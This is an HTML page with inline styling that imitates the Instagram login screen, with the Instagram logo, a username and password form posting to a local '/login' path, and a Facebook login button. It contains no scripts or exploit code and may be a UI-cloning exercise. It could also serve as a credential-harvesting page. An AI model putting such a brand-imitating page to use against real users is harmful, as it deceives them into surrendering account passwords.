<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 20px;
      width: 350px;
      text-align: center;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    /* Style for the image */
    .logo-image {
      width: 150px;
      /* Adjust the size as needed */
      height: auto;
      /* Maintain aspect ratio */
      margin-bottom: 15px;
    }

    .input-field {
      width: 100%;
      margin-bottom: 10px;
    }

    .input-field input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
      font-size: 14px;
    }

    .btn {
      width: 100%;
      background-color: #0095f6;
      color: white;
      border: none;
      padding: 10px;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }

    .btn:disabled {
      background-color: #b2dffc;
      cursor: not-allowed;
    }

    .separator {
      display: flex;
      align-items: center;
      margin: 15px 0;
    }

    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .separator span {
      padding: 0 10px;
      color: #8e8e8e;
      font-size: 12px;
    }

    .signup {
      margin-top: 20px;
      font-size: 14px;
    }

    .signup a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>

<body>
  <div class="login-container">
    <!-- Instagram Logo Image -->
    <img src="images/instagram.png" alt="Instagram Logo" class="logo-image">
    <form action="/login" method="POST">
      <div class="input-field">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
      </div>
      <div class="input-field">
        <input type="password" name="password" placeholder="Password" required>
      </div>
      <button type="submit" class="btn">Log In</button>
    </form>
    <div class="separator">
      <span>OR</span>
    </div>
    <button class="btn" style="background-color: #385185;">Log in with Facebook</button>
    <div class="signup">
      Don't have an account? <a href="/signup">Sign up</a>
    </div>
  </div>
</body>

</html>
